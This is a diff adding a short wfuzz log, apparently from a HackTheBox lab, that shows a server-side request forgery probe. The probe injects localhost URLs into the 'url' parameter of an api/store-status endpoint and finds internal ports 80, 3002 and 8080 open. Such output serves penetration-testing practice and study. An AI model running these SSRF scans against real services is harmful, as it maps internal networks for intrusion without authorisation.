@@ -1,0 +1,13 @@
+Target: http://hat-valley.htb/api/store-status?url=%22http%3A%2F%2Flocalhost%3AFUZZ%22
+Total requests: 65535
+==================================================================
+ID    Response   Lines      Word         Chars          Request    
+==================================================================
+00080:  C=200      8 L	      13 W	    132 Ch	  "80"
+03002:  C=200    685 L	    5834 W	  77002 Ch	  "3002"
+08080:  C=200     54 L	     163 W	   2881 Ch	  "8080"
+
+Total time: 0
+Processed Requests: 65535
+Filtered Requests: 65532
+Requests/sec.: 0
